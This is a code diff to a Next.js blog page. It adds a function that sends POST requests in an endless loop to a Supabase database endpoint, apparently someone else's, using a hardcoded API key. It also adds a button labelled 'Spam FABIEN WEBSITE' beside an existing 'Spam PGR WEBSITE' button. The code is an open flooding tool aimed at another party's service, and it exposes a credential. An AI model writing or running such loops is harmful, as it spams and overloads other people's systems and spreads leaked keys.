@@ -65,6 +65,27 @@ export default function Home(props: HomeProps) {
     }
   }
 
+  async function postRequestFABIEN() {
+    while (true) {
+      fetch(
+        "https://wcejseoasfslqunfxmdr.supabase.co/rest/v1/post?columns=%22title%22%2C%22summary%22",
+        {
+          method: "POST",
+          body: JSON.stringify(dataPGR),
+          headers: {
+            apikey:
+              "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpyYndnbXhteXJ1emJvdnRqZGhsIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NDk3MDU0NzksImV4cCI6MTk2NTI4MTQ3OX0.BjMoYOdZ9VPHy-YRNrJPyKMwlivKc-OycycevZO99NU",
+            authorization:
+              "bearer" +
+              "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImpyYndnbXhteXJ1emJvdnRqZGhsIiwicm9sZSI6ImFub24iLCJpYXQiOjE2NDk3MDU0NzksImV4cCI6MTk2NTI4MTQ3OX0.BjMoYOdZ9VPHy-YRNrJPyKMwlivKc-OycycevZO99NU",
+            Accept: "application/json",
+            "Content-Type": "application/json",
+          },
+        }
+      );
+    }
+  }
+
   return (
     <div>
       <h1>NEXTJS BLOG</h1>
@@ -91,6 +112,9 @@ export default function Home(props: HomeProps) {
         <button type="submit">Save</button>
         <button type="button" onClick={postRequestPGR}>
           Spam PGR WEBSITE
+        </button>
+        <button type="button" onClick={postRequestPGR}>
+          Spam FABIEN WEBSITE
         </button>
       </form>
       <hr />
